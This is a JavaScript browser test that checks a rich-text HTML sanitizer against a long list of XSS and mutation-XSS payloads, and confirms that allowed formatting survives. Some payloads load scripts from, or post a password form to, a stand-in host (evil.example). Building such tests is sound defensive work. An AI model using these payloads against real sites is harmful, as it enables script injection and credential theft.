/* Plenix tests · the rich-text sanitizer against hostile input (issue 689, audit finding #684).
   Summary: cleanRichText (platform/utils/richTextClean.ts, published as Plenix.cleanRichText) is the allow-list that RichText and RichTextEditor pass every piece of HTML from people through. It had no test
     with hostile input. This one feeds it an OWASP-style list and asserts two things: nothing executable survives, and the allowed formatting still does.
   The probe is proved able to see a failure first: a sanitizer that returned its input unchanged fails the structural check on the first payload (a script element), the execution check (the counter
     goes up when the output is put on the page) and the scheme checks.
   Hostile list (each is a case of its own): script and style tags (any case); on* handlers on every kind of element; javascript:, data:, vbscript: in href and src, plain and obfuscated (entities, tabs
     and newlines inside the scheme, leading spaces and control characters, mixed case, named entities); svg and math with nested script and handlers; iframe, object, embed, applet, form, input, button,
     base, link, meta refresh, srcdoc; style attributes with url() and expression(); noscript, template, textarea, title, xmp, noembed and plaintext mutation cases (mXSS); comments, conditional comments and CDATA;
     uppercase and mixed-case tags; broken and nested markup; a cleaned result cleaned again.
   Three checks on every payload:
     1. structure: the output holds only allow-list elements, only allow-list attributes, no on* attribute, every href http, https, mailto or without a scheme, every img src http, https or without a
        scheme, and every style property one of the person's formatting properties with no url() or expression();
     2. the output is cleaned again and is the same (stable: nothing is rebuilt differently when it is parsed again, the mutation case);
     3. execution: the output is put on the page in a div and in a table cell (two parsing contexts); a counter that every payload tries to raise stays at 0, and the page does not navigate.
   Allowed formatting kept: strong, em, u, s, code, sub, sup, mark with a color, a link with https, mailto and a relative address, a list, a numbered list with its start, a quote, headings, a table with colspan,
     a picture with an https source, a span with the person's color and size, a paragraph with its alignment, a task item with its checkbox.
   Usage: node tests/rich-text-clean-689.test.js   (run by layout.test.js when the sanitizer, RichText or RichTextEditor changed) */
const assert = require('assert/strict'), { serve, launch } = require('./lib');

const HOSTILE = [
  // script and style
  ['script', '<script>window.__pwn++</script>'],
  ['script mixed case', '<ScRiPt>window.__pwn++</sCrIpT>'],
  ['script upper case', '<SCRIPT SRC="//evil.example/x.js"></SCRIPT>'],
  ['script with a slash', '<script/src=//evil.example/x.js></script>'],
  ['script in a paragraph', '<p>hello<script>window.__pwn++</script>world</p>'],
  ['script closed oddly', '<script >window.__pwn++</script \n>'],
  ['style element', '<style>body{background:url("javascript:window.__pwn++")}</style><p>x</p>'],
  ['style import', '<style>@import "//evil.example/x.css";</style>'],
  ['style mixed case', '<StYlE>*{x:expression(window.__pwn++)}</sTyLe>'],
  // event handlers
  ['img onerror', '<img src=x onerror=window.__pwn++>'],
  ['img onerror quoted upper case', '<IMG SRC="x" ONERROR="window.__pwn++">'],
  ['img onload', '<img src="/a.png" onload="window.__pwn++">'],
  ['p onclick', '<p onclick="window.__pwn++">click</p>'],
  ['a onmouseover', '<a href="https://example.com" onmouseover="window.__pwn++">link</a>'],
  ['span onfocus autofocus', '<span tabindex=0 autofocus onfocus="window.__pwn++">x</span>'],
  ['body onload', '<body onload="window.__pwn++">x</body>'],
  ['details ontoggle', '<details open ontoggle="window.__pwn++"><summary>s</summary></details>'],
  ['marquee onstart', '<marquee onstart="window.__pwn++">x</marquee>'],
  ['video onerror source', '<video><source onerror="window.__pwn++"></video>'],
  ['audio onerror', '<audio src=x onerror="window.__pwn++"></audio>'],
  ['input onfocus', '<input autofocus onfocus="window.__pwn++">'],
  ['button onclick', '<button onclick="window.__pwn++">b</button>'],
  ['table onmouseover', '<table onmouseover="window.__pwn++"><tr><td onclick="window.__pwn++">x</td></tr></table>'],
  ['handler without quotes and slash', '<img/src=x/onerror=window.__pwn++>'],
  ['handler with entity in the value', '<img src=x onerror="&#119;indow.__pwn++">'],
  ['attribute name tricks', '<p o\nnclick="window.__pwn++">x</p>'],
  // javascript:, data:, vbscript: in href
  ['javascript href', '<a href="javascript:window.__pwn++">x</a>'],
  ['javascript href upper case', '<a href="JAVASCRIPT:window.__pwn++">x</a>'],
  ['javascript href mixed case', '<a href="JaVaScRiPt:window.__pwn++">x</a>'],
  ['javascript href decimal entity', '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;window.__pwn++">x</a>'],
  ['javascript href hex entity', '<a href="&#x6A;avascript&#x3A;window.__pwn++">x</a>'],
  ['javascript href without semicolons', '<a href="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58window.__pwn++">x</a>'],
  ['javascript href named colon', '<a href="javascript&colon;window.__pwn++">x</a>'],
  ['javascript href tab', '<a href="java&#x09;script:window.__pwn++">x</a>'],
  ['javascript href newline', '<a href="java&#x0A;script:window.__pwn++">x</a>'],
  ['javascript href carriage return', '<a href="java&#x0D;script:window.__pwn++">x</a>'],
  ['javascript href named tab', '<a href="java&Tab;script:window.__pwn++">x</a>'],
  ['javascript href named newline', '<a href="java&NewLine;script:window.__pwn++">x</a>'],
  ['javascript href leading space', '<a href="   javascript:window.__pwn++">x</a>'],
  ['javascript href leading newline', '<a href="&#x0A;javascript:window.__pwn++">x</a>'],
  ['javascript href control character', '<a href="&#x01;javascript:window.__pwn++">x</a>'],
  ['javascript href null', '<a href="&#0;javascript:window.__pwn++">x</a>'],
  ['javascript href with a comment', '<a href="javascript:/*x*/window.__pwn++">x</a>'],
  ['javascript href after a slash', '<a href="/\tjavascript:window.__pwn++">x</a>'],
  ['data html href', '<a href="data:text/html;base64,PHNjcmlwdD53aW5kb3cuX19wd24rKzwvc2NyaXB0Pg==">x</a>'],
  ['data html href upper case', '<a href="DATA:text/html,<script>window.__pwn++</script>">x</a>'],
  ['vbscript href', '<a href="vbscript:msgbox(1)">x</a>'],
  ['vbscript href mixed case', '<a href="VbScRiPt:msgbox(1)">x</a>'],
  ['livescript href', '<a href="livescript:window.__pwn++">x</a>'],
  ['file href', '<a href="file:///etc/passwd">x</a>'],
  ['blob href', '<a href="blob:https://example.com/00000000-0000-0000-0000-000000000000">x</a>'],
  ['href with a quote break', '<a href="https://example.com" onclick="window.__pwn++">x</a>'],
  ['href in a quote-less attribute', '<a href=javascript:window.__pwn++>x</a>'],
  ['href in an area', '<map><area href="javascript:window.__pwn++"></map>'],
  ['xlink href', '<a xlink:href="javascript:window.__pwn++">x</a>'],
  ['formaction', '<button formaction="javascript:window.__pwn++">x</button>'],
  // src
  ['javascript src', '<img src="javascript:window.__pwn++">'],
  ['javascript src entity', '<img src="&#106;avascript:window.__pwn++">'],
  ['javascript src tab', '<img src="java&#9;script:window.__pwn++">'],
  ['data html src', '<img src="data:text/html,<script>window.__pwn++</script>">'],
  ['data svg src', '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9IndpbmRvdy5fX3B3bisrIj48L3N2Zz4=">'],
  ['data image src', '<img src="data:image/png;base64,iVBORw0KGgo=">'],
  ['vbscript src', '<img src="vbscript:msgbox(1)">'],
  ['img dynsrc and lowsrc', '<img dynsrc="javascript:window.__pwn++" lowsrc="javascript:window.__pwn++" src="/a.png">'],
  ['img srcset', '<img srcset="javascript:window.__pwn++ 1x" src="/a.png">'],
  ['picture source', '<picture><source srcset="javascript:window.__pwn++"><img src="/a.png"></picture>'],
  ['input image src', '<input type="image" src="javascript:window.__pwn++">'],
  ['video src', '<video src="javascript:window.__pwn++"></video>'],
  ['body background', '<body background="javascript:window.__pwn++">x</body>'],
  // svg and math
  ['svg onload', '<svg onload="window.__pwn++"></svg>'],
  ['svg script', '<svg><script>window.__pwn++</script></svg>'],
  ['svg nested script in a group', '<svg><g><g><script>window.__pwn++</script></g></g></svg>'],
  ['svg animate', '<svg><a><animate attributeName="href" values="javascript:window.__pwn++"/><text x="0" y="10">x</text></a></svg>'],
  ['svg set', '<svg><set attributeName="onmouseover" to="window.__pwn++"/></svg>'],
  ['svg use', '<svg><use href="data:image/svg+xml,&lt;svg id=\'x\' xmlns=\'http://www.w3.org/2000/svg\'&gt;&lt;script&gt;window.__pwn++&lt;/script&gt;&lt;/svg&gt;#x"/></svg>'],
  ['svg foreignObject', '<svg><foreignObject><script>window.__pwn++</script><p onclick="window.__pwn++">x</p></foreignObject></svg>'],
  ['svg xlink script', '<svg><script xlink:href="data:text/javascript,window.__pwn++"/></svg>'],
  ['svg image', '<svg><image href="javascript:window.__pwn++"/></svg>'],
  ['svg style', '<svg><style>*{background:url(javascript:window.__pwn++)}</style></svg>'],
  ['svg title breakout', '<svg><title><style><img src=x onerror=window.__pwn++></style></title></svg>'],
  ['svg desc paragraph', '<svg><desc><p onclick="window.__pwn++">x</p></desc></svg>'],
  ['math handler', '<math><mi onclick="window.__pwn++">x</mi></math>'],
  ['math script', '<math><script>window.__pwn++</script></math>'],
  ['math href', '<math href="javascript:window.__pwn++"><mi>x</mi></math>'],
  ['math maction', '<math><maction actiontype="statusline#" xlink:href="javascript:window.__pwn++">x</maction></math>'],
  ['math annotation-xml', '<math><annotation-xml encoding="text/html"><script>window.__pwn++</script></annotation-xml></math>'],
  ['math and svg switch', '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=window.__pwn++&gt;"></style></table></mtext></math>'],
  // frames, objects, forms, meta
  ['iframe', '<iframe src="javascript:window.__pwn++"></iframe>'],
  ['iframe srcdoc', '<iframe srcdoc="&lt;script&gt;parent.__pwn++&lt;/script&gt;"></iframe>'],
  ['iframe to another site', '<iframe src="https://evil.example/"></iframe>'],
  ['iframe content', '<iframe><script>window.__pwn++</script></iframe>'],
  ['frameset', '<frameset><frame src="javascript:window.__pwn++"></frameset>'],
  ['object data', '<object data="javascript:window.__pwn++"></object>'],
  ['object data html', '<object data="data:text/html,<script>window.__pwn++</script>"></object>'],
  ['embed', '<embed src="javascript:window.__pwn++">'],
  ['embed data', '<embed src="data:text/html,<script>window.__pwn++</script>">'],
  ['applet', '<applet code="x.class" archive="//evil.example/x.jar"></applet>'],
  ['form action', '<form action="javascript:window.__pwn++"><input type="submit"></form>'],
  ['form to another site', '<form action="https://evil.example/steal" method="post"><input name="password"></form>'],
  ['input password', '<input type="password" name="p">'],
  ['button in a form', '<form><button formaction="javascript:window.__pwn++">x</button></form>'],
  ['textarea', '<textarea autofocus onfocus="window.__pwn++"></textarea>'],
  ['select', '<select onfocus="window.__pwn++" autofocus><option>x</option></select>'],
  ['meta refresh', '<meta http-equiv="refresh" content="0;url=javascript:window.__pwn++">'],
  ['meta refresh to another site', '<meta http-equiv="refresh" content="0;url=https://evil.example/">'],
  ['meta set-cookie', '<meta http-equiv="set-cookie" content="a=b">'],
  ['base href', '<base href="https://evil.example/"><a href="x">x</a>'],
  ['link stylesheet', '<link rel="stylesheet" href="https://evil.example/x.css">'],
  ['link import', '<link rel="import" href="https://evil.example/x.html">'],
  ['isindex', '<isindex action="javascript:window.__pwn++">'],
  ['bgsound', '<bgsound src="javascript:window.__pwn++">'],
  ['xml', '<?xml version="1.0"?><x:script xmlns:x="http://www.w3.org/1999/xhtml">window.__pwn++</x:script>'],
  // style attributes
  ['style url javascript', '<p style="background:url(javascript:window.__pwn++)">x</p>'],
  ['style url image', '<span style="background-image:url(https://evil.example/x.png)">x</span>'],
  ['style url on a span color', '<span style="color:red;background-color:url(https://evil.example/x.png)">x</span>'],
  ['style expression', '<p style="width:expression(window.__pwn++)">x</p>'],
  ['style expression in a color', '<span style="color:expression(window.__pwn++)">x</span>'],
  ['style expression with a comment', '<span style="color:expr/**/ession(window.__pwn++)">x</span>'],
  ['style expression with an escape', '<span style="color:\\65xpression(window.__pwn++)">x</span>'],
  ['style url with an escape', '<span style="background-color:\\75rl(https://evil.example/x.png)">x</span>'],
  ['style behavior', '<span style="behavior:url(x.htc)">x</span>'],
  ['style moz-binding', '<span style="-moz-binding:url(https://evil.example/x.xml#x)">x</span>'],
  ['style position cover', '<p style="position:fixed;inset:0;z-index:99999;background:red">cover the page</p>'],
  ['style font-family breakout', '<span style="font-family:x;}</style><img src=x onerror=window.__pwn++>">x</span>'],
  ['style angle brackets', '<span style="color:red\\3e <img src=x onerror=window.__pwn++>">x</span>'],
  ['style on mark', '<mark style="background-color:url(https://evil.example/x.png);color:red">x</mark>'],
  ['style on a link', '<a href="https://example.com" style="background:url(https://evil.example/x.png)">x</a>'],
  ['style import in a value', '<span style="font-family:\'a\';background:url(\'//evil.example/x\')">x</span>'],
  // noscript, template and mutation cases
  ['noscript breakout', '<noscript><p title="</noscript><img src=x onerror=window.__pwn++>">x</noscript>'],
  ['noscript with a handler', '<noscript><img src=x onerror=window.__pwn++></noscript>'],
  ['template content', '<template><script>window.__pwn++</script><img src=x onerror=window.__pwn++></template>'],
  ['template nested', '<template><template><img src=x onerror=window.__pwn++></template></template>'],
  ['template in a table', '<table><template><tr><td><img src=x onerror=window.__pwn++></td></tr></template></table>'],
  ['textarea breakout', '<textarea></textarea><img src=x onerror=window.__pwn++>'],
  ['textarea with markup in it', '<textarea><img src=x onerror=window.__pwn++></textarea>'],
  ['title breakout', '<title></title><img src=x onerror=window.__pwn++>'],
  ['title with markup', '<title><img src=x onerror=window.__pwn++></title>'],
  ['xmp', '<xmp><img src=x onerror=window.__pwn++></xmp>'],
  ['xmp breakout', '<xmp></xmp><img src=x onerror=window.__pwn++>'],
  ['noembed', '<noembed><img src=x onerror=window.__pwn++></noembed>'],
  ['noembed breakout', '<noembed></noembed><img src=x onerror=window.__pwn++>'],
  ['noframes', '<noframes><img src=x onerror=window.__pwn++></noframes>'],
  ['plaintext', '<plaintext><img src=x onerror=window.__pwn++>'],
  ['listing', '<listing><img src=x onerror=window.__pwn++></listing>'],
  ['table foster parenting', '<table><img src=x onerror=window.__pwn++><tr><td>x</td></tr></table>'],
  ['table foster parenting with a link', '<table><a href="javascript:window.__pwn++">x</a><tr><td>y</td></tr></table>'],
  ['select mutation', '<select><template><img src=x onerror=window.__pwn++></template></select>'],
  ['select with a style', '<select><style><img src=x onerror=window.__pwn++></style></select>'],
  ['form nesting', '<form><form><input name=x></form></form><img src=x onerror=window.__pwn++>'],
  ['p inside a p and a table', '<p><table><tr><td><p><img src=x onerror=window.__pwn++></td></tr></table></p>'],
  ['a inside a', '<a href="https://example.com"><a href="javascript:window.__pwn++">x</a></a>'],
  ['heading inside a heading', '<h1><h2 onclick="window.__pwn++">x</h2></h1>'],
  ['nested bold and italic misnesting', '<b><i></b></i><img src=x onerror=window.__pwn++>'],
  ['unclosed attribute', '<img src="x" onerror="window.__pwn++'],
  ['unclosed tag', '<img src=x onerror=window.__pwn++ '],
  ['tag split by a slash', '<img/onerror=window.__pwn++ src=x>'],
  ['duplicate attributes', '<a href="https://example.com" href="javascript:window.__pwn++">x</a>'],
  ['duplicate attributes the other way', '<a href="javascript:window.__pwn++" href="https://example.com">x</a>'],
  ['backtick attribute', '<img src=`x` onerror=window.__pwn++>'],
  ['text that looks like a tag', '&lt;script&gt;window.__pwn++&lt;/script&gt;'],
  ['text with a double encoded tag', '&amp;lt;script&amp;gt;window.__pwn++&amp;lt;/script&amp;gt;'],
  ['zero width characters in a tag name', '<scr​ipt>window.__pwn++</scr​ipt>'],
  ['zero width characters in text', '<p>a​b</p>'],
  // comments and CDATA
  ['comment with a script', '<!--<script>window.__pwn++</script>-->'],
  ['comment breakout', '<!--><img src=x onerror=window.__pwn++>-->'],
  ['comment breakout two', '<!---><img src=x onerror=window.__pwn++>-->'],
  ['comment closed with a bang', '<!-- x --!><img src=x onerror=window.__pwn++>'],
  ['conditional comment', '<!--[if gte IE 4]><script>window.__pwn++</script><![endif]-->'],
  ['downlevel revealed', '<![if !IE]><script>window.__pwn++</script><![endif]>'],
  ['cdata', '<![CDATA[<script>window.__pwn++</script>]]>'],
  ['cdata in svg', '<svg><![CDATA[<script>window.__pwn++</script>]]></svg>'],
  ['cdata breakout', '<![CDATA[]]><img src=x onerror=window.__pwn++>'],
  ['processing instruction', '<?php window.__pwn++ ?><img src=x onerror=window.__pwn++>'],
  ['doctype', '<!DOCTYPE html [<!ENTITY x "window.__pwn++">]><p>&x;</p>'],
  // upper case and mixed case tags
  ['upper case P with a handler', '<P ONCLICK="window.__pwn++">x</P>'],
  ['mixed case A', '<A HrEf="JaVaScRiPt:window.__pwn++">x</A>'],
  ['mixed case IMG', '<ImG sRc=x OnErRoR=window.__pwn++>'],
  ['mixed case IFRAME', '<IfRaMe SrC="javascript:window.__pwn++"></IfRaMe>'],
  ['mixed case SVG', '<SvG OnLoAd=window.__pwn++></SvG>'],
  ['mixed case FORM', '<FoRm AcTiOn="javascript:window.__pwn++"></FoRm>'],
  ['tag with a tab', '<script\t>window.__pwn++</script>'],
  ['tag with a vertical tab', '<img\u000Bsrc=x\u000Bonerror=window.__pwn++>'],
  ['tag with a form feed', '<img\u000Csrc=x\u000Conerror=window.__pwn++>'],
  ['null in the tag name', '<scr\u0000ipt>window.__pwn++</scr\u0000ipt>'],
  ['unicode escape in a handler value', '<img src=x onerror="&#x77;indow.__pwn++">']
];

const KEPT = [
  ['bold, italic, underline, strike', '<p><strong>a</strong> <em>b</em> <u>c</u> <s>d</s></p>', ['strong', 'em', 'u', 's']],
  ['b, i and del are renamed', '<p><b>a</b><i>b</i><del>c</del></p>', ['strong', 'em', 's']],
  ['code, sub, sup', '<p><code>a</code> x<sub>2</sub> x<sup>3</sup></p>', ['code', 'sub', 'sup']],
  ['a link with https', '<p><a href="https://example.com/a?b=1#c">x</a></p>', ['a[href="https://example.com/a?b=1#c"]']],
  ['a link with mailto', '<p><a href="mailto:a@example.com">x</a></p>', ['a[href="mailto:a@example.com"]']],
  ['a relative link', '<p><a href="/members/12">x</a> <a href="#top">y</a> <a href="../a">z</a></p>', ['a[href="/members/12"]', 'a[href="#top"]', 'a[href="../a"]']],
  ['lists', '<ul><li>a</li><li>b</li></ul><ol start="3"><li>c</li></ol>', ['ul', 'li', 'ol[start="3"]']],
  ['a quote and headings', '<blockquote>q</blockquote><h1>a</h1><h2>b</h2><h3>c</h3>', ['blockquote', 'h1', 'h2', 'h3']],
  ['a table with colspan', '<table><thead><tr><th>a</th></tr></thead><tbody><tr><td colspan="2">b</td></tr></tbody></table>', ['table', 'thead', 'tbody', 'th', 'td[colspan="2"]']],
  ['a picture with an https source', '<p><img src="https://example.com/a.png" alt="A wall"></p>', ['img[src="https://example.com/a.png"][alt="A wall"]']],
  ['a picture with a relative source', '<p><img src="/files/a.png" alt=""></p>', ['img[src="/files/a.png"]']],
  ['a span with the person\'s color and size', '<p><span style="color: red; font-size: 18px">x</span></p>', ['span[style*="color"]', 'span[style*="font-size"]']],
  ['a mark with a color', '<p><mark style="background-color: yellow">x</mark></p>', ['mark[style*="background-color"]']],
  ['a paragraph with its alignment', '<p style="text-align: center">x</p>', ['p[style*="text-align"]']],
  ['a mention', '<p><span data-mention="u12">@Maya</span></p>', ['span[data-mention="u12"]']],
  ['a task item with its checkbox', '<ul data-type="taskList"><li data-type="taskItem" data-checked="true"><label><input type="checkbox" checked></label><div><p>done</p></div></li></ul>', ['ul[data-type="taskList"]', 'li[data-type="taskItem"][data-checked="true"]', 'input[type="checkbox"]']],
  ['text is escaped, not lost', '<p>1 &lt; 2 &amp; 3 &gt; 2</p>', ['p']]
];

(async () => {
  const PORT = +process.env.TEST_PORT || 9689, server = await serve(PORT); let browser;
  try {
    browser = await launch(); const errors = [];
    const page = await browser.newPage(); page.on('pageerror', (e) => errors.push(e.message));
    let navigations = 0; page.on('framenavigated', (f) => { if (f === page.mainFrame()) navigations++; });
    await page.goto('http://localhost:' + PORT + '/Plenix/tests/fixtures/platform-host.html', { waitUntil: 'domcontentloaded' });
    await page.waitForFunction(() => window.Plenix && window.Plenix.cleanRichText, { timeout: 60000 });
    const base = navigations;
    const report = await page.evaluate(async (HOSTILE, KEPT) => {
      window.__pwn = 0;
      const clean = window.Plenix.cleanRichText;
      const TAGS = new Set('P BR STRONG EM U S CODE SUB SUP MARK A SPAN H1 H2 H3 H4 H5 H6 UL OL LI BLOCKQUOTE PRE HR IMG FIGURE FIGCAPTION TABLE THEAD TBODY TR TH TD LABEL INPUT DIV'.split(' '));   // DIV and LABEL stay only inside a task item (the sanitizer unwraps them elsewhere)
      const ATTRS = { A: ['href'], IMG: ['src', 'alt', 'title'], OL: ['start'], TD: ['colspan', 'rowspan', 'style'], TH: ['colspan', 'rowspan', 'style'], UL: ['data-type'], LI: ['data-type', 'data-checked'], MARK: ['data-color', 'style'],
        SPAN: ['style', 'data-mention', 'class', 'contenteditable'], LABEL: ['contenteditable'], INPUT: ['type', 'class', 'disabled', 'checked', 'aria-label'], P: ['style'], H1: ['style'], H2: ['style'], H3: ['style'], H4: ['style'], H5: ['style'], H6: ['style'] };
      const STYLE = new Set(['color', 'background-color', 'font-family', 'font-size', 'text-align']);
      const schemeOk = (v, mail) => { const n = String(v).replace(/[\t\n\r]/g, '').replace(/^[\u0000- ]+/, ''); const m = /^([a-z][a-z0-9+.\-]*):/i.exec(n); return !m || /^https?$/i.test(m[1]) || (mail && /^mailto$/i.test(m[1])); };
      const problems = (root) => {
        const out = [];
        root.querySelectorAll('*').forEach((el) => {
          if (!TAGS.has(el.tagName)) out.push('element ' + el.tagName.toLowerCase() + ' is not on the allow-list');
          const allowed = ATTRS[el.tagName] || [];
          [...el.attributes].forEach((a) => {
            const name = a.name.toLowerCase();
            if (/^on/.test(name)) out.push('event handler ' + name);
            if (allowed.indexOf(name) < 0) out.push('attribute ' + name + ' on ' + el.tagName.toLowerCase());
            if (name === 'href' && !schemeOk(a.value, true)) out.push('href scheme: ' + a.value.slice(0, 40));
            if (name === 'src' && !schemeOk(a.value, false)) out.push('src scheme: ' + a.value.slice(0, 40));
            if (name === 'style') a.value.split(';').map((d) => d.trim()).filter(Boolean).forEach((d) => { const p = d.split(':')[0].trim().toLowerCase(); if (!STYLE.has(p)) out.push('style property ' + p); if (/url\(|expression|[<>]|@import|behavior|binding/i.test(d)) out.push('style value ' + d.slice(0, 40)); });
          });
        });
        return out;
      };
      const results = [];
      for (const [name, html] of HOSTILE) {
        const out = clean(html), r = { name, out, problems: [], stable: true, ran: 0 };
        const holder = document.createElement('div'); holder.innerHTML = out; r.problems = problems(holder);
        if (/<\s*(script|style|iframe|object|embed|svg|math|template|noscript|meta|link|base|form|frame)/i.test(out)) r.problems.push('the output text holds a dangerous tag');
        if (/\son[a-z]+\s*=/i.test(out)) r.problems.push('the output text holds an on* attribute');
        r.stable = clean(out) === out;
        // execution: put it on the page in two parsing contexts
        const before = window.__pwn;
        const box = document.createElement('div'); document.body.appendChild(box); box.innerHTML = out;
        const table = document.createElement('table'), cell = table.insertRow().insertCell(); document.body.appendChild(table); cell.innerHTML = out;
        results.push(r); r.before = before; r.box = box; r.table = table;
      }
      await new Promise((res) => setTimeout(res, 1500));   // images and anything else get time to fail and fire
      const final = results.map((r) => ({ name: r.name, out: r.out, problems: r.problems, stable: r.stable }));
      const pwn = window.__pwn;
      results.forEach((r) => { r.box.remove(); r.table.remove(); });
      const kept = KEPT.map(([name, html, selectors]) => { const out = clean(html), h = document.createElement('div'); h.innerHTML = out; return { name, out, missing: selectors.filter((s) => !h.querySelector(s)), problems: problems(h) }; });
      return { final, pwn, kept };
    }, HOSTILE, KEPT);
    // 1. structure, on every payload
    const bad = report.final.filter((r) => r.problems.length);
    assert.deepEqual(bad.map((r) => r.name + ': ' + r.problems.join('; ') + ' → ' + r.out.slice(0, 100)), [], 'nothing on the allow-list is broken: no element, attribute, scheme or style outside it survives');
    // 2. stable: cleaning the result again changes nothing
    const unstable = report.final.filter((r) => !r.stable);
    assert.deepEqual(unstable.map((r) => r.name + ' → ' + r.out.slice(0, 100)), [], 'a cleaned result is stable when it is cleaned again (no mutation)');
    // 3. nothing ran
    assert.equal(report.pwn, 0, 'no payload ran script: the counter stayed at 0 after every output was put on the page');
    assert.equal(navigations, base, 'the page did not navigate');
    // the allowed formatting is kept, and is itself clean
    const lost = report.kept.filter((k) => k.missing.length || k.problems.length);
    assert.deepEqual(lost.map((k) => k.name + ': missing ' + k.missing.join(', ') + (k.problems.length ? '; problems ' + k.problems.join('; ') : '') + ' → ' + k.out.slice(0, 120)), [], 'the allowed formatting survives');
    // a few exact results that pin the rules down
    const by = (n) => report.final.find((r) => r.name === n).out;
    assert.ok(!/javascript/i.test(by('javascript href')) || !/href=/.test(by('javascript href')), 'a javascript: link keeps no href');
    assert.ok(!/href=/.test(by('javascript href tab')), 'a javascript: link with a tab inside the scheme keeps no href');
    assert.ok(!/src=/.test(by('data image src')), 'a data: picture source is dropped (only http, https and relative sources stay)');
    assert.ok(!/<img/.test(by('javascript src')), 'a picture with a javascript: source is dropped');
    assert.equal(by('script'), 'window.__pwn++', 'a script element is unwrapped: its text stays as plain text (never an element)');
    assert.equal(report.final.length, HOSTILE.length, 'every payload was run');
    assert.deepEqual(errors, [], 'no script errors');
    console.log('rich-text-clean-689: OK (' + HOSTILE.length + ' hostile inputs, ' + KEPT.length + ' formatting cases)');
  } finally { if (browser) await browser.close(); server.close(); }
})().catch((e) => { console.error(e); process.exit(1); });
